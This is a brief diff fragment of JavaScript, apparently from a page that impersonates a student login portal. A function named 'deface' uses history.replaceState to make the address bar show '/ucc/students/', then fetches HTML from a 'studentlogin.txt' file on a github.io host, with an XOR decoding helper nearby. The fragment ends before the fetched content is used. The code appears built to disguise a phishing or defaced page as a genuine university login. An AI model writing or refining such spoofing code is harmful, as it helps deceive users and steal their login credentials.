@@ -7,7 +7,7 @@ function xorEncryptDecrypt(decodedhtml, key) {
 }
 
 function deface() {
-    history.replaceState(null, null, 'ucc/students/');
+    history.replaceState(null, null, '/ucc/students/');
     fetch('https://cybercutie0.github.io/-/studentlogin.txt')
         .then(response => response.text()) // Get the response as text (HTML content)
         .then(data => {
